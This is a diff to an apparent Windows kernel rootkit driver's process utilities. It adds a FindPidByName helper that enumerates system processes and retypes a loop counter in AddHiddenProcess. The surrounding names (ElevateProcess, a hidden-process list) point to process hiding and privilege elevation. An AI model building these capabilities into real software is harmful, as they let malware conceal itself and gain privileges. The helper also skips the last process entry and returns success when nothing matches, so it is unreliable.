@@ -267,6 +267,65 @@ NTSTATUS ProcessUtils::ElevateProcess(ULONG pid) {
 
 /*
 * Description:
+* FindPidByName is responsible for finding process's PID by name.
+*
+* Parameters:
+* @processName [WCHAR*]	  -- Process name to find.
+* @pid		   [ULONG*]	  -- Output found PID.
+*
+* Returns:
+* @status	   [NTSTATUS] -- Whether successfully found or not.
+*/
+NTSTATUS ProcessUtils::FindPidByName(WCHAR* processName, ULONG* pid) {
+	NTSTATUS status = STATUS_SUCCESS;
+	PSYSTEM_PROCESS_INFO originalInfo = NULL;
+	PSYSTEM_PROCESS_INFO info = NULL;
+	ULONG infoSize = 0;
+
+	if (!pid || !processName)
+		return STATUS_INVALID_PARAMETER;
+
+	status = ZwQuerySystemInformation(SystemProcessInformation, NULL, 0, &infoSize);
+
+	while (status == STATUS_INFO_LENGTH_MISMATCH) {
+		if (originalInfo)
+			ExFreePoolWithTag(originalInfo, DRIVER_TAG);
+		originalInfo = (PSYSTEM_PROCESS_INFO)ExAllocatePoolWithTag(PagedPool, infoSize, DRIVER_TAG);
+
+		if (!originalInfo)
+			break;
+		status = ZwQuerySystemInformation(SystemProcessInformation, originalInfo, infoSize, &infoSize);
+	}
+
+	if (!NT_SUCCESS(status) || !originalInfo) {
+		if (!originalInfo)
+			status = STATUS_INSUFFICIENT_RESOURCES;
+		else
+			ExFreePoolWithTag(originalInfo, DRIVER_TAG);
+		return status;
+	}
+
+	// Using another info variable to avoid BSOD on freeing.
+	info = originalInfo;
+
+	// Iterating the processes information until our pid is found.
+	while (info->NextEntryOffset) {
+		if (info->ImageName.Buffer && info->ImageName.Length > 0) {
+			if (_wcsicmp(info->ImageName.Buffer, processName) == 0) {
+				*pid = HandleToULong(info->UniqueProcessId);
+				break;
+			}
+		}
+		info = (PSYSTEM_PROCESS_INFO)((PUCHAR)info + info->NextEntryOffset);
+	}
+
+	if (originalInfo)
+		ExFreePoolWithTag(originalInfo, DRIVER_TAG);
+	return status;
+}
+
+/*
+* Description:
 * AddHiddenProcess is responsible for adding a hidden process to the list of hidden processes.
 *
 * Parameters:
@@ -276,7 +335,7 @@ NTSTATUS ProcessUtils::ElevateProcess(ULONG pid) {
 * @status [bool]  -- Whether successfully added or not.
 */
 bool ProcessUtils::AddHiddenProcess(PLIST_ENTRY entry, DWORD pid) {
-	for (int i = 0; i < MAX_PIDS; i++) {
+	for (ULONG i = 0; i < MAX_PIDS; i++) {
 		if (this->HiddenProcesses.Processes[i].Pid == 0) {
 			this->HiddenProcesses.Processes[i].ListEntry = entry;
 			this->HiddenProcesses.Processes[i].Pid = pid;
